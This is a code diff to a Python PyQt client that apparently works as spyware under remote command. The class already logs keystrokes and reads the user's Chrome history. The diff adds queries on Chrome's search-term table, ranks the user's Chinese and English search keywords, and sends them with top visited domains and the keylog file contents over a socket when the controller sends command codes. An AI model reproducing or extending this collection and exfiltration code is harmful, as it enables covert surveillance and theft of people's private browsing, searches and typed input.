@@ -10,6 +10,8 @@ class MyLogin(QMainWindow,Ui_MainWindow):
     def __init__(self):
         super(MyLogin, self).__init__()
         self.setupUi(self)
+        self.lineEdit.setAttribute(QtCore.Qt.WA_InputMethodEnabled,False)
+        self.lineEdit_2.setAttribute(QtCore.Qt.WA_InputMethodEnabled,False)
         self.status = MyStatus()
         self.status.signal.connect(self.out_log)
 
@@ -20,10 +22,16 @@ class MyLogin(QMainWindow,Ui_MainWindow):
         self.thread_in.signal.connect(self.netreport)
 
         self.keyboard_get=keyboard_log()
+        with open('stop for en.txt') as f1:
+            self.stopen=list(map(lambda s:s.strip(),f1.readlines()))
+        with open('stop for cn.txt') as f2:
+            self.stopcn=list(map(lambda s:s.strip(),f2.readlines()))
 
         self.net_io=[0,0]
 
     def __del__(self):
+        del self.stopen,self.stopcn
+        self.history_conn.close()
         self.thread_in.terminate()
         self.thread_in.wait()
         self.user_sock.close()
@@ -42,6 +50,19 @@ class MyLogin(QMainWindow,Ui_MainWindow):
         else:
             domain = sublevel_split[0].split('.', 1)[1]
         return domain
+    def dealwith_key(self,keyin):
+        en_re=''
+        for i in keyin:
+            if ord(i)<256:en_re+=i
+            else:en_re+=' '
+        import re,jieba
+        uncn = re.compile(r'[\u4e00-\u9fa5]')
+        cn_re = ''.join(uncn.findall(keyin))
+        temp_cn=jieba.lcut(cn_re,cut_all=False)
+        temp_en=en_re.strip().split()
+        list_cn=[cni for cni in temp_cn if cni not in self.stopcn]
+        list_en=[eni for eni in temp_en if eni not  in self.stopen]
+        return list_cn,list_en
 
     def get_history(self):
         pre_path=os.path.expanduser('~')+r'\AppData\Local\Google\Chrome\User Data\Default'
@@ -51,16 +72,31 @@ class MyLogin(QMainWindow,Ui_MainWindow):
             shutil.copyfile(history_path,new_name)
             self.history_conn=sqlite3.connect(new_name)
             self.history_cursor=self.history_conn.cursor()
-            self.history_cursor.execute('select url, visit_count from urls order by id desc limit 200;')
+            self.history_cursor.execute('select url, visit_count from urls order by id desc limit 400;')
             result=self.history_cursor.fetchall()
-            url_dict={}
+            self.history_cursor.execute('select lower_term from keyword_search_terms order by url_id desc limit 600')
+            key_result=self.history_cursor.fetchall()
+            self.history_cursor.close()
+            url_dict={};key_cn_dict={};key_en_dict={}
             for i in result:
                 domain=self.dealwith_url(i[0])
                 if domain in list(url_dict.keys()):
                     url_dict[domain]+=i[1]
                 else:url_dict[domain]=i[1]
             url_sorted=sorted(url_dict.items(),key=lambda x:x[1],reverse=True)
-            return url_sorted[:20]
+            for k in key_result:
+                cn_re,en_re =self.dealwith_key(k[0])
+                for cni in cn_re:
+                    if cni not in list(key_cn_dict.keys()):
+                        key_cn_dict[cni]=1
+                    else:key_cn_dict[cni]+=1
+                for eni in en_re:
+                    if eni not in list(key_en_dict.keys()):
+                        key_en_dict[eni]=1
+                    else:key_en_dict[eni]+=1
+            cn_key_sorted=sorted(key_cn_dict.items(),key=lambda x:x[1],reverse=True)
+            en_key_sorted=sorted(key_en_dict.items(),key=lambda d:d[1],reverse=True)
+            return url_sorted[:10],cn_key_sorted[:20],en_key_sorted[:20]
         else:
             print('Wrong path!')
             return None
@@ -75,15 +111,15 @@ class MyLogin(QMainWindow,Ui_MainWindow):
             self.monitornet.terminate()
             self.monitornet.wait()
         elif one_in[0]['code']==66:   #键盘记录
-            with open('check.txt') as keyinfo:
+            with open('check.txt',encoding='gb18030',errors='ignore') as keyinfo:
                 alltext=keyinfo.read()
-                msg=[{'code':67,'text':alltext}]
-                msg_json=json.dumps(msg)
-                self.user_sock.send(msg_json.encode())
+            msg = [{'code': 67, 'text': alltext}]
+            msg_json = json.dumps(msg)
+            self.user_sock.send(msg_json.encode())
         elif one_in[0]['code']==77:
-            url_sorted=self.get_history()
+            url_sorted,cnkey,enkey=self.get_history()
             if url_sorted !=None:
-                msg=[{'code':78,'history':url_sorted}]
+                msg=[{'code':78,'history':url_sorted,'cnkey':cnkey,'enkey':enkey}]
                 msg_json=json.dumps(msg)
                 self.user_sock.send(msg_json.encode())
             else:
